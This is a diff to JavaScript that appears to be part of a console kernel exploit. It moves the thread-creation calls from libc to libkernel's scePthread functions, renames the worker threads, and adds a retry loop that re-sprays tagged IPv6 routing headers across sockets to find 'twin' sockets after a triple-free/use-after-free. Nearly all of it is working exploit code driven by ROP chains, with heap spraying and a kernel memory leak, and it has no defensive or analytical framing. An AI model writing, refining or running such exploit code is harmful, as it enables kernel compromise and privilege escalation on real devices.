@@ -249,12 +249,12 @@ log('')
 log('=== STAGE 3: Trigger Triple-Free & Find Twins/Triplet ===')
 log('')
 
-// Get pthread functions from libc (real function addresses)
-var pthread_create_addr = libc_addr.add(new BigInt(0, PTHREAD_CREATE_OFFSET))
-var pthread_exit_addr = libc_addr.add(new BigInt(0, PTHREAD_EXIT_OFFSET))
+// Get scePthread functions from libkernel
+var pthread_create_addr = libkernel_addr.add(new BigInt(0, SCE_PTHREAD_CREATE_OFFSET))
+var pthread_exit_addr = libkernel_addr.add(new BigInt(0, SCE_PTHREAD_EXIT_OFFSET))
 
-log('[STAGE3] pthread_create at: ' + pthread_create_addr.toString())
-log('[STAGE3] pthread_exit at: ' + pthread_exit_addr.toString())
+log('[STAGE3] scePthreadCreate at: ' + pthread_create_addr.toString())
+log('[STAGE3] scePthreadExit at: ' + pthread_exit_addr.toString())
 
 // Allocate buffers for netcontrol and getsockopt
 var set_buf = mem.malloc(8)
@@ -317,28 +317,24 @@ for (var w = 0; w < NUM_WORKER_THREADS; w++) {
   // Allocate pthread_t storage
   var pthread_addr = mem.malloc(8)
 
-  // Allocate thread name string ("iov_worker_N")
+  // Allocate thread name
   var thread_name = mem.malloc(16)
   mem.write1(thread_name.add(new BigInt(0, 0)), 0x69)  // 'i'
   mem.write1(thread_name.add(new BigInt(0, 1)), 0x6F)  // 'o'
   mem.write1(thread_name.add(new BigInt(0, 2)), 0x76)  // 'v'
   mem.write1(thread_name.add(new BigInt(0, 3)), 0x5F)  // '_'
-  mem.write1(thread_name.add(new BigInt(0, 4)), 0x77)  // 'w'
-  mem.write1(thread_name.add(new BigInt(0, 5)), 0x6B)  // 'k'
-  mem.write1(thread_name.add(new BigInt(0, 6)), 0x72)  // 'r'
-  mem.write1(thread_name.add(new BigInt(0, 7)), 0x5F)  // '_'
-  mem.write1(thread_name.add(new BigInt(0, 8)), 0x30 + w)  // '0'-'3'
-  mem.write1(thread_name.add(new BigInt(0, 9)), 0)  // null terminator
+  mem.write1(thread_name.add(new BigInt(0, 4)), 0x30 + w)  // '0'-'3'
+  mem.write1(thread_name.add(new BigInt(0, 5)), 0)
 
-  // scePthreadCreate(thread, attr, start_routine, arg, name)
+  // scePthreadCreate(thread, attr, func, arg, name)
   var pthread_store = mem.malloc(0x100)
   var pthread_insts = build_rop_chain(
     pthread_create_addr,
     pthread_addr,
-    new BigInt(0, 0), // attr = NULL
+    new BigInt(0, 0),
     worker_func,
-    new BigInt(0, 0), // arg = NULL
-    thread_name       // thread name
+    new BigInt(0, 0),
+    thread_name
   )
   rop.store(pthread_insts, pthread_store, 1)
   rop.execute(pthread_insts, pthread_store, 0x10)
@@ -467,39 +463,57 @@ log('[STAGE3] Step 3: Finding twins (sockets sharing same rthdr)...')
 var getsockopt_wrapper = new BigInt(kapi.getsockopt_hi, kapi.getsockopt_lo)
 var found_twins = false
 
-// Check for twins (workers already sprayed tags)
-for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-  mem.write8(leak_len_buf, new BigInt(0, UCRED_SIZE))
+for (var attempt = 0; attempt < 10 && !found_twins; attempt++) {
+  // Re-spray tags across all sockets
+  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+    mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)
 
-  var get_insts = build_rop_chain(
-    getsockopt_wrapper,
-    new BigInt(0, ipv6_sockets[i]),
-    new BigInt(0, IPPROTO_IPV6),
-    new BigInt(0, IPV6_RTHDR),
-    leak_rthdr_buf,
-    leak_len_buf
-  )
-  rop.store(get_insts, store_addr, 1)
-  rop.execute(get_insts, store_addr, 0x10)
-
-  var val = mem.read4(leak_rthdr_buf.add(new BigInt(0, 4)))
-  var j = val & 0xFFFF
-
-  if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
-    twins[0] = i
-    twins[1] = j
-    found_twins = true
-    log('[STAGE3] Found twins: socket[' + i + '] and socket[' + j + '] share rthdr')
-    break
+    var spray_insts = build_rop_chain(
+      setsockopt_wrapper,
+      new BigInt(0, ipv6_sockets[i]),
+      new BigInt(0, IPPROTO_IPV6),
+      new BigInt(0, IPV6_RTHDR),
+      rthdr_buf,
+      new BigInt(0, rthdr_size)
+    )
+    rop.store(spray_insts, store_addr, 1)
+    rop.execute(spray_insts, store_addr, 0x10)
   }
 
-  if ((i + 1) % 32 === 0) {
-    log('[STAGE3] Checked ' + (i + 1) + '/' + IPV6_SOCK_NUM + ' sockets...')
+  // Check for twins
+  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+    mem.write8(leak_len_buf, new BigInt(0, UCRED_SIZE))
+
+    var get_insts = build_rop_chain(
+      getsockopt_wrapper,
+      new BigInt(0, ipv6_sockets[i]),
+      new BigInt(0, IPPROTO_IPV6),
+      new BigInt(0, IPV6_RTHDR),
+      leak_rthdr_buf,
+      leak_len_buf
+    )
+    rop.store(get_insts, store_addr, 1)
+    rop.execute(get_insts, store_addr, 0x10)
+
+    var val = mem.read4(leak_rthdr_buf.add(new BigInt(0, 4)))
+    var j = val & 0xFFFF
+
+    if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
+      twins[0] = i
+      twins[1] = j
+      found_twins = true
+      log('[STAGE3] Found twins: socket[' + i + '] and socket[' + j + '] share rthdr')
+      break
+    }
+  }
+
+  if (!found_twins) {
+    log('[STAGE3] Twin search attempt ' + (attempt + 1) + '/10...')
   }
 }
 
 if (!found_twins) {
-  log('[STAGE3] FAILED: Could not find twins')
+  log('[STAGE3] FAILED: Could not find twins after 10 attempts')
   throw new Error('Failed to find twins - UAF may have failed')
 }
 
